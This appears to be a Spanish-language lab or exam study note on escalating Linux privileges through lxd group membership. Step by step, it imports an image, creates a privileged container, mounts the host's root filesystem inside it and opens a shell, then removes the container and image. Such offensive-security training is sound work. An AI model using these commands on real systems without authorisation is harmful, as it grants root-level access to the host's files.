
## 1. Enumeración

Los contenedores comparten el kernel del sistema anfitrión, pero aíslan sus procesos. **LXC** permite ejecutar sistemas Linux aislados y **LXD** gestiona contenedores de sistema.

Comprueba si el usuario pertenece al grupo `lxd`:

```
id
```

Busca plantillas de contenedores disponibles:

```
ls -la
```

Por ejemplo, HTB muestra una plantilla llamada `ubuntu-template.tar.xz`.

## 2. Importar una imagen

Importa la plantilla y asígnale un alias:

```
lxc image import ubuntu-template.tar.xz --alias ubuntutemp
```

Comprueba las imágenes disponibles:

```
lxc image list
```

## 3. Crear un contenedor privilegiado

Crea un contenedor con la imagen importada:

```
lxc init ubuntutemp privesc -c security.privileged=true
```

- `ubuntutemp`: alias de la imagen.
    
- `privesc`: nombre del contenedor.
    
- `security.privileged=true`: configura el contenedor como privilegiado.
    

## 4. Montar el sistema anfitrión

Añade el sistema de archivos raíz del anfitrión al contenedor:

```
lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
```

- `privesc`: nombre del contenedor.
    
- `host-root`: nombre del dispositivo añadido.
    
- `source=/`: raíz del sistema anfitrión.
    
- `path=/mnt/root`: ruta donde se monta dentro del contenedor.
    
- `recursive=true`: incluye los subdirectorios.
    

## 5. Acceder al contenedor

Inicia el contenedor:

```
lxc start privesc
```

Abre una shell:

```
lxc exec privesc /bin/bash
```

Una vez dentro, comprueba el contenido del sistema anfitrión:

```
ls -la /mnt/root
```

Si el montaje se ha realizado correctamente, podrás acceder a las rutas del anfitrión desde `/mnt/root`, incluidos directorios como `/mnt/root/root`.

## 6. Enumeración y limpieza

Lista los contenedores:

```
lxc list
```

Lista las imágenes:

```
lxc image list
```

Para eliminar el contenedor de laboratorio:

```
lxc stop privesc
lxc delete privesc
```

Para eliminar la imagen importada:

```
lxc image delete ubuntutemp
```

**Importante:** sustituye los nombres por los que aparezcan en tu entorno. Si un contenedor ya está detenido, puedes eliminarlo directamente.

## Conceptos clave para el examen

- Comprueba los grupos del usuario con `id`.
    
- Busca plantillas existentes y comprueba si puedes importar imágenes.
    
- Un usuario perteneciente al grupo `lxd` puede disponer de capacidades que permitan escalar privilegios.
    
- La combinación de un contenedor privilegiado y el montaje de `/` del anfitrión puede permitir acceder a archivos del sistema anfitrión.
    
- Distingue entre **imagen** (`lxc image list`) y **contenedor** (`lxc list`): son recursos diferentes.
